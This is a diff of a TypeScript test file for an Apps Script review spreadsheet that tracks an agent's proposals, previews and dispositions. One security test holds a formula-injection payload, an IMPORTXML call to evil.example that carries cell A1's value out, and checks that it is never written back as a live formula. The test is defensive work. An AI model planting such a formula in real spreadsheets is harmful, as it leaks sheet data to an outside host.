@@ -13,11 +13,17 @@ import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 
-import { buildConfig, buildScript, chunks, CODE_GS_URL, configRows, readable, tabInstructions, tocRows } from "./build-review-sheet-script.js";
+import { buildConfig, buildScript, chunks, CODE_GS_RAW, CODE_GS_URL, LIBRARY_ID, STUB_GS_URL, configRows, draftingSheetSync, linkLines, readable, repoOfSite, sheetIdOf, tabInstructions, tocRows } from "./build-review-sheet-script.js";
 import { readFileSync as readText } from "node:fs";
 import { feedbackBasis, hashOf } from "./feedback-issue.js";
 
 const code = buildScript();
+/** A fake Apps Script TextStyle builder: every setter chains; build() keeps bold. */
+const textStyle = () => {
+  const st: { bold?: boolean } = {};
+  const c: Record<string, unknown> = new Proxy({}, { get: (_t, k) => (k === "build" ? () => ({ ...st }) : (v: unknown) => { if (k === "setBold") st.bold = !!v; return c; }) });
+  return c;
+};
 const withConfig = <T extends object>(t: T, rows: string[][]) => ({ ...t, Config: { id: 50, rows } });
 
 type Prot = { col: string; from?: number; desc: string; editors: string[]; removed: boolean; api?: { getDescription(): string; remove(): void } };
@@ -100,6 +106,7 @@ function runtime(tabs: Record<string, { id: number; rows: string[][] }>) {
         getDisplayValues: () => t.rows.slice(r - 1, r - 1 + nr).map((row) => row.slice(c - 1, c - 1 + nc)),
         setValues: (v: unknown[][]) => put(name, t.rows[r === 1 ? 0 : hdr(name)][c - 1], r, v),
         setRichTextValues: (v: unknown[][]) => put(name, t.rows[r === 1 ? 0 : hdr(name)][c - 1], r, v),
+        setRichTextValue: (v: unknown) => put(name, t.rows[r === 1 ? 0 : hdr(name)][c - 1], r, [[v]]),
         clearContent: () => {},
         setBackground(bg: string) { ((t as { bg?: Record<number, string> }).bg ??= {})[r] = bg; return this; },
         setVerticalAlignment() { return this; },
@@ -112,7 +119,7 @@ function runtime(tabs: Record<string, { id: number; rows: string[][] }>) {
     const b = {
       setText: (s: string) => ((r.text = s), b),
       setLinkUrl: (a: number, z: number, u: string) => (r.links.push([a, z, u]), b),
-      setTextStyle: (a: number, z: number) => (r.bold.push([a, z]), b),
+      setTextStyle: (a: number, z: number, st?: { bold?: boolean }) => (st?.bold && r.bold.push([a, z]), b),
       build: () => r,
     };
     return b;
@@ -127,7 +134,7 @@ function runtime(tabs: Record<string, { id: number; rows: string[][] }>) {
       }),
       newRichTextValue: builder,
       ProtectionType: { RANGE: "RANGE" },
-      newTextStyle: () => ({ setBold: () => ({ build: () => ({ bold: true }) }) }),
+      newTextStyle: textStyle,
     },
     LockService: { getDocumentLock: () => ({ tryLock: () => true, releaseLock: () => {} }) },
     PropertiesService: {
@@ -141,6 +148,7 @@ function runtime(tabs: Record<string, { id: number; rows: string[][] }>) {
   return { g, written, props, sheet, toasts };
 }
 
+const T = (x: unknown) => (x && typeof x === "object" && "text" in (x as object) ? (x as { text: string }).text : x);
 function load(code: string, g: Record<string, unknown>) {
   const fn = new Function(...Object.keys(g), `${code}\nreturn { refreshAll, markDirty, refreshIfDirty };`);
   return fn(...Object.values(g)) as { refreshAll(): void; markDirty(e: unknown): void; refreshIfDirty(): void };
@@ -289,7 +297,7 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     t["Agent - Comments"].rows[2][2] = "Needs human";
     const rt2 = runtime(withConfig(t, pcRows));
     load(code, rt2.g).refreshAll();
-    expect(rt2.written["Review Change Sets"]["Agentic status (filter)"]).toEqual([["Needs human"], ["Not started"]]);
+    expect(rt2.written["Review Change Sets"]["Agentic status (filter)"]).toEqual([["Needs you: answer the agent's question"], ["Not started"]]);
   });
 
   test("a Colour key row above RPC's and RCS's headers changes nothing the script writes", () => {
@@ -324,13 +332,52 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
     t["Agent - Change Sets"].rows[1].push(basis);
     const run = () => { const b = runtime(t); load(code, b.g).refreshAll(); return b.written["Review Change Sets"] ?? {}; };
-    expect(run()["Committee Feedback (agent)"]).toBeUndefined();
+    // Only the status is added (this sheet has no Agentic status column, so
+    // the status block sits on top); the proposal is not flagged.
+    expect(T(run()["Committee Feedback (agent)"]?.[0]?.[0])).toBe("\u23f3 r#130 open; no preview yet.\n\u21b3 r#97 (PR open, 2026-10-30 22:30Z) \u00b7 Adds the scope\n\u21b3 r#130 (PR open) \u00b7 Fixes a typo\nProposal");
     expect(run()["Ready for agent"]).toBeUndefined();
     // Control: a real change is still caught under the new name.
     row[3] = "do it differently";
     const w = run();
-    expect(String(w["Committee Feedback (agent)"][0][0])).toMatch(/^\u26a0 Stale: /);
+    expect(String(T(w["Committee Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: /);
     expect(w["Ready for agent"][0][0]).toBe("No");
+  });
+
+  test("on a slow sheet, an edit of Review Change Sets flags a stale proposal at once, before the timer", () => {
+    const hdr = ["Change-set", "Title", "TWG (CS)", "Committee Feedback (CL)", "Change Set Feedback (agent)", "Ready for agent"];
+    const row = ["CS-001", "Fix scope", "TWG 1", "do it", "Proposal", "Yes"];
+    const basis = feedbackBasis(hdr, row, ["Title", "TWG (CS)"], "Committee Feedback");
+    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
+    t["Review Change Sets"].rows = [hdr, row];
+    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
+    t["Agent - Change Sets"].rows[1].push(basis);
+    row[3] = "do it differently";
+    const rt2 = runtime(t);
+    rt2.props.lastMs = "20000";
+    load(code, rt2.g).markDirty({ range: { getSheet: () => rt2.sheet("Review Change Sets") } });
+    expect(rt2.props.dirty).toBe("1");
+    expect(String(T(rt2.written["Review Change Sets"]["Change Set Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: /);
+  });
+
+  test("an Editor setting Ready for agent shows in the agent's feedback at once, even on a slow sheet (owner, 2026-10-31)", () => {
+    const hdr = ["Change-set", "Title", "TWG (CS)", "Committee Feedback (CL)", "Change Set Feedback (agent)", "Ready for agent"];
+    const row = ["CS-001", "Fix scope", "TWG 1", "do it", "Proposal", "Yes"];
+    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
+    t["Review Change Sets"].rows = [hdr, row];
+    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
+    t["Agent - Change Sets"].rows[1].push(feedbackBasis(hdr, row, ["Title", "TWG (CS)"], "Committee Feedback"));
+    const rt2 = runtime(t);
+    rt2.props.lastMs = "20000";
+    const sheet = rt2.sheet("Review Change Sets");
+    const edit = (c: number) => ({ range: { getSheet: () => sheet, getColumn: () => c, getNumColumns: () => 1, getRow: () => 2, getNumRows: () => 1 } });
+    load(code, rt2.g).markDirty(edit(6));
+    expect(rt2.props["ready:CS-001"]).toMatch(/^\d{4}-\d\d-\d\d \d\d:\d\dZ$/);
+    expect(String(T(rt2.written["Review Change Sets"]["Change Set Feedback (agent)"][0][0]))).toMatch(/^\u23f3 Ready for agent set .*: the agent will act on this and rewrite it\.\nProposal$/);
+    // An edit of another column records nothing.
+    const rt3 = runtime(t);
+    rt3.props.lastMs = "20000";
+    load(code, rt3.g).markDirty({ range: { ...edit(4).range, getSheet: () => rt3.sheet("Review Change Sets") } });
+    expect(rt3.props["ready:CS-001"]).toBeUndefined();
   });
 
   test("a sheet with both agent tables on one Agent tab, as before 2026-10-31, works the same", () => {
@@ -447,7 +494,7 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(dRows.slice(0, 5).map((r) => r[0])).toEqual(["Instructions", "Instructions - Install script", "Instructions - Dropdown", "Instructions - Editors", "Key"]);
     expect(dRows[0][1]).toContain("only the owner edits");
     // Installing Code.gs, step by step, with the project named after the sheet (owner, 2026-10-31).
-    expect(dRows[1][1]).toMatch(/Extensions, then Apps Script[\s\S]*Name the project after this spreadsheet[\s\S]*installTriggers[\s\S]*Advanced/);
+    expect(dRows[1][1]).toMatch(/Extensions, then Apps Script[\s\S]*Name the project after this sheet[\s\S]*Libraries[\s\S]*HEAD[\s\S]*Review[\s\S]*Advanced/);
     expect(dRows[1][1]).toContain("Google hasn't verified this app. The app is requesting access to sensitive info in your Google Account.");
     expect(dRows[1][1]).toContain("https://support.google.com/cloud/answer/7454865");
     expect(dRows[2][1]).toContain("Allow multiple selections");
@@ -479,7 +526,7 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(dRows.find((r) => !(/^Instructions/.test(r[0]) || ["Key", "EDITORS"].includes(r[0])))?.[0]).toBe("CFG");
     expect(dRows.filter((r) => ["GUIDE", "SETUP"].includes(r[0]))).toHaveLength(0);
     expect(dRows.find((r) => r[0] === "EDITORS")![1]).toBe("");
-    expect(dRows.every((r, i) => /^Instructions|^Key$/.test(r[0]) || r[0] === "EDITORS" || r[1].startsWith("|"))).toBe(true);
+    expect(dRows.every((r) => /^Instructions|^Key$/.test(r[0]) || r[0] === "EDITORS" || r[1].startsWith("|"))).toBe(true);
     expect(JSON.parse(dRows.find((r) => r[0] === "CFG")![1].slice(1)).MODE).toBe("drafting");
   });
 
@@ -564,6 +611,17 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(live()[0].editors).toEqual(["owner@x.example"]);
   });
 
+  test("a Yes first seen on a row the agent already completed counts from that completion", () => {
+    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
+    const fbRows = t["Contributor Feedback"].rows;
+    fbRows[0].push("Ready for agent");
+    fbRows.forEach((r, i) => i && r.push(i === 1 ? "Yes" : ""));
+    const rt2 = runtime(t);
+    load(code, rt2.g).refreshAll();
+    expect(rt2.props["ready:CS-004"]).toBe("2026-10-30 23:40Z");
+    expect((rt2.written["Contributor Feedback"]["Agentic status"][0][0] as Rich).text.startsWith("Waiting")).toBe(false);
+  });
+
   test("any filled row gets a Change-set; one holding only No does not", () => {
     const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
     const fbRows = t["Contributor Feedback"].rows;
@@ -638,15 +696,15 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"]).toBeUndefined();
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
     f[1][1] = "Define registry and register";
     s.refreshAll();
-    const stale = rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0] as string;
-    expect(stale).toMatch(/^\u26a0 Stale: .*\nDefine it in 1\.1$/);
+    const stale = T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]) as string;
+    expect(stale).toMatch(/^\u26a0 Stale: .*\n\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current\.\nDefine it in 1\.1$/);
     f[1][1] = "Define registry";
     f[1][9] = stale;
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]).toBe("Define it in 1.1");
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
   });
 
   test("the agent column under its new name, Feedback (agent), is read the same, and never counts as a person's feedback", () => {
@@ -660,10 +718,10 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]["Feedback (agent)"]).toBeUndefined();
+    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).not.toMatch(/Stale/);
     f[1][1] = "A new title";
     s.refreshAll();
-    expect(String(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0])).toMatch(/^\u26a0 Stale: .*\nQuestion for the editor/);
+    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: .*\n\u23f3 .*\nQuestion for the editor/);
   });
 
   test("a new empty feedback column marks nothing stale, and a basis written the older way still matches", () => {
@@ -682,13 +740,13 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]).toBeUndefined();
+    expect(String(T(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]?.[0]?.[0]) ?? "")).not.toMatch(/Stale/);
     // The agent writes the new basis; then a new reviewer's empty column appears.
     t.Agent.rows[1][t.Agent.rows[0].indexOf("Feedback basis (change set)")] = feedbackBasis(f[0], f[1]);
     f[0].splice(ag, 0, "Contributor Feedback (XY)");
     f.slice(1).forEach((x) => x.splice(ag, 0, ""));
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]).toBeUndefined();
+    expect(String(T(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]?.[0]?.[0]) ?? "")).not.toMatch(/Stale/);
   });
 
   test("a proposal turning stale sets Ready for agent back to No, once, so an Editor's new Yes stays", () => {
@@ -709,7 +767,7 @@ describe("review-sheet.gs in drafting mode", () => {
     s.refreshAll();
     expect(rt2.written["Contributor Feedback"]["Ready for agent"][0][0]).toBe("No");
     // Still stale, and an Editor sets Yes again: it stays.
-    f[1][ag] = rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0] as string;
+    f[1][ag] = T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]) as string;
     f[1][rd] = "Yes";
     delete rt2.written["Contributor Feedback"]["Ready for agent"];
     s.refreshAll();
@@ -739,7 +797,8 @@ describe("review-sheet.gs in drafting mode", () => {
     const at = (n: string) => h.indexOf(n);
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
-    const text = () => (rt2.written["Contributor Feedback"]["Staging review"][0][0] as Rich).text;
+    // The first line: the QA gate, on the second, has its own test.
+    const text = () => (rt2.written["Contributor Feedback"]["Staging review"][0][0] as Rich).text.split("\n")[0];
     // Same commit: no warning, even though Agent completed is later than Staging built.
     s.refreshAll();
     expect(text()).toBe("review");
@@ -749,13 +808,24 @@ describe("review-sheet.gs in drafting mode", () => {
     t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "pending";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 deploy in progress");
+    expect(text()).toBe("review \u26a0 stale, restaging: Pages is deploying it");
+    t.Agent.rows[1][at("Staging deploy (change set)")] = "deploying, expected 2026-10-31 15:20Z";
+    s.refreshAll();
+    expect(text()).toBe("review \u26a0 stale, restaging: Pages is deploying it, expected live 2026-10-31 15:20Z");
+    t.Agent.rows[1][at("Staging deploy (change set)")] = "pushed";
+    s.refreshAll();
+    expect(text()).toBe("review \u26a0 stale, restaging: on gh-pages, waiting for Pages to deploy");
+    t.Agent.rows[1][at("Staging built from (change set)")] = "abcdef1";
+    t.Agent.rows[1][at("Staging deploy (change set)")] = "building";
+    s.refreshAll();
+    expect(text()).toBe("review \u26a0 stale: built from abcdef1, PR now at 1234567; restaging: building the preview");
+    t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "failed";
     s.refreshAll();
     expect(text()).toBe("review \u26a0 deploy failed");
     t.Agent.rows[1][at("Staging review page (change set)")] = "";
     s.refreshAll();
-    expect(text()).toBe("\u26a0 no preview yet");
+    expect(text()).toBe("\u26a0 no preview yet: not ready for merge");
   });
 
   test("a public-comment edit is kept for the next tick when the rebuild cannot start", () => {
@@ -774,6 +844,32 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(rt3.written["Review Change Sets"]).toBeDefined();
   });
 
+  test("the change set's Dispositions blurb is shown from the Agent tab (owner, 2026-10-31)", () => {
+    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
+    const f = t["Contributor Feedback"].rows;
+    f[0].push("Disposition (agent)");
+    f.forEach((x, i) => i && x.push(""));
+    t.Agent.rows[0].push("Disposition (change set)");
+    t.Agent.rows[1].push("Accepted: define registry in 1.1. Noted: style of 1.2.");
+    t.Agent.rows.slice(2).forEach((x) => x.push(""));
+    const rt2 = runtime(t);
+    load(code, rt2.g).refreshAll();
+    expect(T(rt2.written["Contributor Feedback"]["Disposition (agent)"][0][0])).toBe("Accepted: define registry in 1.1. Noted: style of 1.2.");
+  });
+
+  test("each comment of the change set needs one disposition; an overall statement is allowed (owner, 2026-10-31)", () => {
+    const fns = new Function("SpreadsheetApp", `${code}\nreturn { dispositionProblems };`)({}) as { dispositionProblems: (t: string, n: string[], h?: Record<string, string>) => string };
+    const ok = "Decided (Q1, 2026-10-31): A, by the Editor; gloss it.\nOverall: partly accepted as editorial.\nNo. 136: Accepted. Defined at first use.\nNos. 127 to 129 and 131: Not accepted. Already addressed.\nNo. 130: Noted.";
+    expect(fns.dispositionProblems(ok, ["127", "128", "129", "130", "131", "136"])).toBe("");
+    expect(fns.dispositionProblems(ok, ["127", "128", "129", "130", "131", "136", "140", "141"])).toBe("\u26a0 No disposition yet for Nos. 140 and 141");
+    expect(fns.dispositionProblems("No. 136: Fixed it.", ["136"])).toMatch(/^\u26a0 No. 136: start with one of Accepted/);
+    expect(fns.dispositionProblems("No. 9: Noted.\nNo. 136: Accepted.\nNo. 136: Noted.", ["136"])).toBe("\u26a0 No. 9 is not in this change set\n\u26a0 No. 136 has two dispositions");
+    // Drawn from the people's Blue Disposition: a different word is flagged;
+    // Pending is not a mismatch, but is listed as not yet confirmed.
+    expect(fns.dispositionProblems("No. 136: Accepted.\nNo. 137: Noted.", ["136", "137"], { "136": "Noted", "137": "Pending" }))
+      .toBe("\u26a0 Not confirmed by the committee (Disposition still Pending): No. 137\n\u26a0 No. 136: Accepted here, Noted in the people's Disposition");
+  });
+
   test("security: text a person or the agent typed is never written back as a formula", () => {
     const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
     const f = t["Contributor Feedback"].rows;
@@ -787,7 +883,8 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     load(code, rt2.g).refreshAll();
     const w = rt2.written["Contributor Feedback"];
-    expect(w["Contributor Feedback (agent)"][0][0]).toBe("'" + '=IMPORTXML("https://evil.example/?"&A1,"//a")');
+    // The progress line now leads, so the cell cannot start as a formula.
+    expect(T(w["Contributor Feedback (agent)"][0][0])).toBe('\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n=IMPORTXML("https://evil.example/?"&A1,"//a")');
     expect(String(w["Selected Sections"][1][0]).startsWith("'=")).toBe(true);
   });
 
@@ -921,7 +1018,99 @@ describe("a copy that is not linked to a repository yet", () => {
   test("says so, with this sheet's ID, instead of failing on a missing row", () => {
     const t = { ...tabs(), Config: { id: 900, rows: [["Key", "Value"], ["EDITORS", ""]] } };
     const rt = runtime(t);
-    expect(() => load(code, rt.g).refreshAll()).toThrow(/not linked to a document repository yet.*copy-sheet-id/);
+    expect(() => load(code, rt.g).refreshAll()).toThrow(/^Ask the agent to link this sheet.*copy-sheet-id/);
+  });
+
+  test("the toast leads with the action and is short enough not to be cut off (owner, 2026-11-01)", () => {
+    const toast = code.match(/ss\.toast\('(Ask the agent to link[^']*)'/)?.[1];
+    expect(toast).toBeDefined();
+    expect(toast!.length).toBeLessThan(100);
+  });
+
+  /** A spreadsheet with one people's tab whose first Instructions cell is `text`. */
+  const setupSheet = (text: string, cfg?: Record<string, string>) => {
+    const cell = { v: text };
+    const tab = {
+      getName: () => "Contributor Feedback", isSheetHidden: () => false, getLastRow: () => 2, getLastColumn: () => 3,
+      getRange: (_r: number, c: number) => ({
+        getDisplayValue: () => (c === 1 ? "Instructions" : cell.v),
+        setValue: (v: string) => { cell.v = v; },
+      }),
+    };
+    const fn = new Function("SpreadsheetApp", "LockService", "PropertiesService", "Utilities", "ScriptApp", "Session",
+      `${code}\nCFG = ${JSON.stringify(cfg ?? null)};\nreturn { markSetup };`);
+    const { markSetup } = fn({}, {}, {}, {}, {}, {}) as { markSetup(ss: unknown, state: string): void };
+    return { cell, run: (state: string) => markSetup({ getSheets: () => [tab] }, state) };
+  };
+  const sites = { SITE_URL: "https://o.github.io/dth/", REPO_URL: "https://github.com/o/dth" };
+
+  test("an unlinked sheet says what to do first on the first line of each tab's Instructions, once", () => {
+    const s = setupSheet("Blue = your input\nsteps");
+    s.run("unlinked");
+    s.run("unlinked");
+    expect(s.cell.v.split("\n")[0]).toMatch(/^\u26a0 Not set up yet\. Step 1 of 2: ask the agent to link this sheet/);
+    expect(s.cell.v.split("\n").filter((l) => l.startsWith("\u26a0")).length).toBe(1);
+    expect(s.cell.v).toContain("Blue = your input\nsteps");
+  });
+
+  test("linked but not installed: the line moves on to Install, and the links appear", () => {
+    const s = setupSheet("\u26a0 Not set up yet. Step 1 of 2: ...\nBlue = your input", sites);
+    s.run("uninstalled");
+    expect(s.cell.v.split("\n")[0]).toMatch(/^\u26a0 Almost set up\. Step 2 of 2: choose Review links, then Install/);
+  });
+
+  test("once installed, the warning goes and the document's site and repository are shown", () => {
+    const s = setupSheet("\u26a0 Almost set up. Step 2 of 2\nBlue = your input", sites);
+    s.run("ready");
+    s.run("ready");
+    expect(s.cell.v).toBe("Blue = your input\nDocument: https://o.github.io/dth/   Repository: https://github.com/o/dth");
+  });
+});
+
+describe("the colour key under a setup line", () => {
+  test("is still coloured segment by segment when a \u26a0 line sits above it", () => {
+    const fn = new Function("SpreadsheetApp", `${code}\nreturn { keyRuns };`);
+    const { keyRuns } = fn({}) as { keyRuns(t: string): [number, number, string][] };
+    const key = "Blue = your input     Green = the agent";
+    const plain = keyRuns(key);
+    const under = keyRuns("\u26a0 Not set up yet. Step 1 of 2: ask\n" + key);
+    const shift = "\u26a0 Not set up yet. Step 1 of 2: ask\n".length;
+    expect(under.slice(0, 2)).toEqual(plain.slice(0, 2).map(([a, z, c]) => [a + shift, z + shift, c]));
+  });
+});
+
+describe("linking a copied template (owner, 2026-11-01: make it mechanical)", () => {
+  test("a sheet link or a bare id gives the spreadsheet id", () => {
+    const id = "1ACmiSvHK2kYlqaL0--p2u4Op7g4R1_BzgNFuW7QUs3Y";
+    expect(sheetIdOf(`https://docs.google.com/spreadsheets/d/${id}/edit?gid=0#gid=0`)).toBe(id);
+    expect(sheetIdOf(id)).toBe(id);
+    expect(() => sheetIdOf("not a sheet")).toThrow();
+  });
+
+  test("a GitHub Pages site names its repository; another host names none", () => {
+    expect(repoOfSite("https://litlfred.github.io/dth-phc/")).toBe("https://github.com/litlfred/dth-phc");
+    expect(repoOfSite("https://example.org/dth/")).toBeUndefined();
+    expect(repoOfSite(undefined)).toBeUndefined();
+  });
+
+  test("a drafting sheet-sync.json follows from the document's name", () => {
+    expect(draftingSheetSync("dth-phc", "https://docs.google.com/spreadsheets/d/1ACmiSvHK2kYlqaL0--p2u4Op7g4R1_BzgNFuW7QUs3Y/edit"))
+      .toEqual({ mode: "drafting", anchors: "folio/dth-phc/review-anchors.json", sectionUrl: "en/dth-phc/#", sheet: "1ACmiSvHK2kYlqaL0--p2u4Op7g4R1_BzgNFuW7QUs3Y" });
+  });
+
+  test("the Config tab shows the site, the repository and the settings file, from repository or iriBase", () => {
+    const repo = draftFolio();
+    writeFileSync(join(repo, "dth.json"), JSON.stringify({ iriBase: "https://o.github.io/dth/" }));
+    const c = buildConfig(repo, "review/drafting/sheet-sync.json");
+    expect(c.CFG.SITE_URL).toBe("https://o.github.io/dth/");
+    expect(c.CFG.REPO_URL).toBe("https://github.com/o/dth");
+    expect(linkLines(c)).toEqual([
+      "Document (GitHub Pages): https://o.github.io/dth/",
+      "Repository: https://github.com/o/dth",
+      "This sheet's settings: https://github.com/o/dth/blob/main/review/drafting/sheet-sync.json",
+    ]);
+    const rows = configRows(c);
+    expect(rows.findIndex((r) => r[0] === "Instructions - Links")).toBeLessThan(rows.findIndex((r) => r[0] === "Key"));
   });
 });
 
@@ -940,6 +1129,12 @@ describe("the Config tab's colours", () => {
 });
 
 describe("running the script from the editor", () => {
+  test("Install never waits on a dialog, which hangs a run started from the editor (owner, 2026-10-31)", () => {
+    const fns = [...code.matchAll(/^function (\w+)\([^)]*\) \{[\s\S]*?^\}/gm)];
+    const withAlert = fns.filter((m) => /\.alert\(/.test(m[0])).map((m) => m[1]);
+    expect(withAlert).toEqual(["showVersion"]);
+  });
+
   test("installTriggers is the first function, so the editor's Run button picks it", () => {
     expect(code.match(/^function (\w+)/m)?.[1]).toBe("installTriggers");
   });
@@ -954,8 +1149,473 @@ describe("the committed Code.gs people copy", () => {
     const committed = readText(join(import.meta.dir, "dist", "Code.gs"), "utf8");
     expect(committed).toBe(buildScript({ stamp: "content" }));
   });
-  test("the install steps link it", () => {
+  test("the install steps link the stub and the library, not the whole script", () => {
     const rows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
-    expect(rows.find((r) => r[0] === "Instructions - Install script")![1]).toContain(CODE_GS_URL);
+    const steps = rows.find((r) => r[0] === "Instructions - Install script")![1];
+    expect(steps).toContain(STUB_GS_URL);
+    expect(steps).toContain(LIBRARY_ID);
+    expect(steps).not.toContain(CODE_GS_URL);
+  });
+});
+
+describe("Ready for agent after the preview was built (owner, 2026-10-31)", () => {
+  const sheets = {
+    newRichTextValue: () => {
+      const v = { text: "", links: [] as unknown[], bold: [] as unknown[] };
+      const b = {
+        setText: (t: string) => ((v.text = t), b),
+        setLinkUrl: (a: number, z: number, u: string) => (v.links.push([a, z, u]), b),
+        setTextStyle: (a: number, z: number, st?: { bold?: boolean }) => (st?.bold && v.bold.push([a, z]), b),
+        build: () => v,
+      };
+      return b;
+    },
+    newTextStyle: textStyle,
+  };
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { stagingWarning, agenticCell, progressLine, withProgress, whenLabel };`)(sheets) as {
+    progressLine: (o: object) => string;
+    withProgress: (t: string, l: string) => string;
+    whenLabel: (at: string, now?: number) => string;
+    stagingWarning: (u: string, b: object, p: object[], r?: string) => string;
+    agenticCell: (s: string, p: object[], o?: object) => { text: string; links: [number, number, string][] };
+  };
+  const pr = { url: "https://github.com/litlfred/dth-hrh/pull/7", head: "b20534f", done: "2026-10-31 08:10Z" };
+  const built = { at: "2026-10-31 08:15Z", from: "b20534f", deploy: "deployed" };
+
+  test("Staging review warns when Ready for agent was set after the build", () => {
+    expect(fns.stagingWarning("u", built, [pr])).toBe("");
+    expect(fns.stagingWarning("u", built, [pr], "2026-10-31 11:30Z")).toBe("\u26a0 missing feedback from 2026-10-31 11:30Z");
+    expect(fns.stagingWarning("u", built, [pr], "2026-10-31 08:00Z")).toBe("");
+  });
+
+  test("the agent's feedback says where the PR and preview are (owner, 2026-10-31)", () => {
+    const o = { prs: [pr], staging: "u", built, status: "Done" };
+    expect(fns.progressLine(o)).toBe("\u23f3 dth-hrh#7 open, updated 2026-10-31 08:10Z; preview current (built 2026-10-31 08:15Z).");
+    expect(fns.progressLine({ ...o, staging: "" })).toBe("\u23f3 dth-hrh#7 open, updated 2026-10-31 08:10Z; no preview yet.");
+    // An Editor's Orange change is noted, not marked stale.
+    const soon = Date.parse("2026-10-31T11:40:00Z"), late = Date.parse("2026-10-31T12:30:00Z");
+    expect(fns.progressLine({ ...o, readyAt: "2026-10-31 11:30Z", now: soon })).toBe("\u23f3 Ready for agent set 2026-10-31 11:30Z: the agent will act on this and rewrite it.");
+    // Nobody picked it up: the row says so, rather than waiting quietly for ever.
+    expect(fns.progressLine({ ...o, readyAt: "2026-10-31 11:30Z", now: late })).toBe("\u23f3 Ready for agent set 2026-10-31 11:30Z: the agent will act on this and rewrite it; \u26a0 no agent has picked this up for 60 min: ask in the project chat.");
+    // An idle (or proposed) step after the Ready time says the agent finished its pass.
+    expect(fns.progressLine({ ...o, readyAt: "2026-10-31 11:30Z", now: late, built: { ...(o as { built?: object }).built, step: "idle 2026-10-31 11:50Z" } })).not.toMatch(/Ready for agent set/);
+    expect(fns.progressLine({ ...o, merge: true, built: { ...built, gate: "Passed b20534f: dispositions match" } })).toBe("\u23f3 Ready for merge set: the agent will merge dth-hrh#7.");
+    expect(fns.progressLine({ ...o, merge: true })).toBe("\u23f3 Ready for merge set: the agent will not merge dth-hrh#7 until the QA gate passes (QA gate: no independent review yet: not ready for merge).");
+    expect(fns.progressLine({ ...o, status: "Working" })).toBe("\u23f3 The agent is working on dth-hrh#7.");
+    expect(fns.progressLine({ ...o, status: "Merged" })).toBe("");
+    expect(fns.progressLine({ prs: [] })).toBe("");
+  });
+
+  test("the progress line is replaced in place, below a stale mark, and never added to an empty cell", () => {
+    const stale = "\u26a0 Stale: the row changed since this proposal; the agent will propose again.";
+    expect(fns.withProgress("Proposal", "\u23f3 a")).toBe("\u23f3 a\nProposal");
+    expect(fns.withProgress("\u23f3 old\nProposal", "\u23f3 new")).toBe("\u23f3 new\nProposal");
+    expect(fns.withProgress(stale + "\n\u23f3 old\nProposal", "\u23f3 new")).toBe(stale + "\n\u23f3 new\nProposal");
+    expect(fns.withProgress("\u23f3 old\nProposal", "")).toBe("Proposal");
+    expect(fns.withProgress("", "\u23f3 a")).toBe("");
+  });
+
+  test("Agentic status says the row is queued, then who has it", () => {
+    const q = fns.agenticCell("Done", [pr], { readyAt: "2026-10-31 11:30Z", now: Date.parse("2026-10-31T11:40:00Z") });
+    expect(q.text.split("\n")[0]).toBe("Waiting on the agent since 2026-10-31 11:30Z (Ready for agent set); it has not recorded a step yet");
+    // A step recorded after Ready for agent says what the agent is doing instead.
